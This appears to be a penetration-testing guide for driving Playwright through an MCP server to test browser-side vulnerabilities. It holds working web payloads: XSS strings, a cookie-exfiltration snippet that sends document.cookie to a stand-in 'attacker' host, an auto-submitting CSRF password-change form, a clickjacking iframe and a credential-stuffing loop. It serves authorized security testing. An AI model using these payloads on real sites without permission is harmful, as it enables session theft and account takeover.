# Playwright Automation for Security Testing

Primary browser-automation tool for client-side / browser-rendered testing. Use Playwright when testing requires JS execution, DOM interaction, SPA flows, or screenshot/video evidence. Use curl / Burp / `requests` for pure server-side testing (SQLi, file upload, path traversal, host header).

## Use it for

- XSS (reflected/stored/DOM), CSRF token tests, Clickjacking, prototype pollution, CORS
- SPA flows (React/Vue/Angular), AJAX-heavy apps, WebSocket features
- Multi-step flows (auth, sessions, business logic)
- Evidence: screenshots, videos, network logs, console logs

## Skip it for

- Plain HTTP / API request crafting where curl or Burp Repeater is faster
- High-throughput payload fuzzing (use ffuf / Intruder)
- Pure server-side classes that don't need a renderer

## MCP setup

```json
{
  "mcpServers": {
    "playwright": {
      "command": "npx",
      "args": ["-y", "@executeautomation/playwright-mcp-server"]
    }
  }
}
```

Tools available: `playwright_navigate`, `playwright_screenshot`, `playwright_click`, `playwright_fill` / `playwright_type`, `playwright_evaluate`, `playwright_snapshot`, `playwright_wait`, `playwright_console_messages`, `playwright_network_requests`, `playwright_navigate_back`.

## Experimentation workflow

For each hypothesis: navigate → snapshot → fill payload → screenshot → trigger → wait → snapshot/screenshot → `playwright_evaluate` for verification → check console + network. Iterate payload/injection point until confirmed; then write a minimal reproducer.

## Reflected XSS pattern

```python
playwright_navigate(url="https://target/search")
playwright_fill(selector="input[name='q']", value="<script>alert('XSS')</script>")
playwright_click(selector="button[type='submit']")
playwright_evaluate(script="() => document.documentElement.innerHTML.includes('<script>alert')")
playwright_screenshot(path="evidence/xss-reflected.png")
```

If basic payload is HTML-encoded, try event-handler bypass:

```python
playwright_fill(selector="input[name='q']", value="<img src=x onerror=alert(1)>")
playwright_click(selector="button[type='submit']")
playwright_evaluate(script="() => document.querySelector('img[src=\"x\"]') !== null")
playwright_screenshot(path="evidence/xss-confirmed.png")
```

Cookie exfil impact PoC:

```python
playwright_fill(selector="input[name='q']",
    value="<img src=x onerror=\"fetch('https://attacker/?c='+document.cookie)\">")
playwright_click(selector="button[type='submit']")
playwright_network_requests()  # confirm outbound to attacker
```

## DOM XSS

```python
playwright_navigate(url="https://target/profile#<img src=x onerror=alert(1)>")
playwright_wait(timeout=2000)
playwright_evaluate(script="() => document.body.innerHTML")
playwright_screenshot(path="evidence/dom-xss.png")
```

## Stored XSS verification

```python
# 1. Inject
playwright_navigate(url="https://target/comment/new")
playwright_fill(selector="textarea[name='content']",
                value="<img src=x onerror=alert('Stored-XSS')>")
playwright_click(selector="button[type='submit']")

# 2. Visit display page (different session for true storage proof)
playwright_navigate(url="https://target/comments")
playwright_evaluate(script="() => document.body.innerHTML.includes('<img src=x onerror=')")
playwright_screenshot(path="evidence/stored-xss-execution.png")
```

## CSRF — token validation absence

After login, inspect form: `playwright_evaluate("() => document.querySelector('input[name=\"csrf_token\"]')")` — null = suspicious. Save attacker page with auto-submitting form to target's state-changing endpoint, then `playwright_navigate(file://...)` and confirm side-effect via `playwright_network_requests()` + screenshots.

Auto-submitting attacker form:
```html
<form id=f action="https://target/api/change-password" method=POST>
  <input name=current_password value="password123">
  <input name=new_password value="hacked123">
  <input name=confirm_password value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>
```

## Clickjacking

```html
<!-- /tmp/cj.html -->
<iframe src="https://target/account/delete" width=800 height=600></iframe>
```
```python
playwright_navigate(url="file:///tmp/cj.html")
playwright_evaluate(script="() => document.querySelector('iframe').contentWindow !== null")
playwright_screenshot(path="evidence/clickjacking.png")
```
Frame load + missing `X-Frame-Options` / `frame-ancestors` confirms vulnerability.

## Auth — credential stuffing demo (test accounts only)

```python
for u, p in candidates:
    playwright_navigate(url="https://target/login")
    playwright_fill(selector="input[name='username']", value=u)
    playwright_fill(selector="input[name='password']", value=p)
    playwright_click(selector="button[type='submit']")
    playwright_wait(timeout=2000)
    playwright_screenshot(path=f"evidence/login-{u}.png")
```

## Session fixation

```python
playwright_navigate(url="https://target")
before = playwright_evaluate(script="() => document.cookie")
# login...
after = playwright_evaluate(script="() => document.cookie")
# before == after on session id => fixation
```

## WebSocket capture

```python
playwright_navigate(url="https://target/chat")
playwright_evaluate(script="""
  () => { const W = window.WebSocket;
    window.WebSocket = function(...a){ const s=new W(...a);
      s.addEventListener('message', e => console.log('WS:', e.data)); return s; }; }
""")
# interact, then playwright_console_messages() to read messages
```

## GraphQL introspection

```python
playwright_navigate(url="https://target/graphql")
playwright_evaluate(script="""
  () => fetch('/graphql', {method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({query:'{__schema{types{name fields{name}}}}'})}).then(r=>r.json())
""")
```

## Race condition (basic burst)

```python
playwright_navigate(url="https://target/checkout")
for _ in range(10):
    playwright_evaluate(script="""
      () => fetch('/api/apply-discount',{method:'POST',body:JSON.stringify({code:'D50'})})
    """)
playwright_wait(timeout=3000)
playwright_screenshot(path="evidence/race.png")
```
For real race-condition tests prefer Burp Turbo Intruder; Playwright is good for quick triage.

## Evidence collection

- Full page: `playwright_screenshot(path=..., full_page=True)`
- Element: `playwright_screenshot(path=..., selector="div.vulnerable")`
- Network: `playwright_network_requests()`
- Console: `playwright_console_messages(level="error")`

## Best practices

- Separate browser context per scenario; clean up after.
- Headless for speed; headed only for visual verification.
- Realistic delays + dialog handlers; account for CAPTCHA / MFA in test envs.
- Use test accounts, not real users; clean up uploaded artifacts.

## Common issues

- Element not found → `playwright_wait` for SPA hydration
- Dialog blocks flow → register dialog handler before action
- CAPTCHA → request test environment without CAPTCHA
- Auth required → login flow first, then test

## Resources

- Playwright: https://playwright.dev
- MCP server: https://github.com/executeautomation/playwright-mcp-server
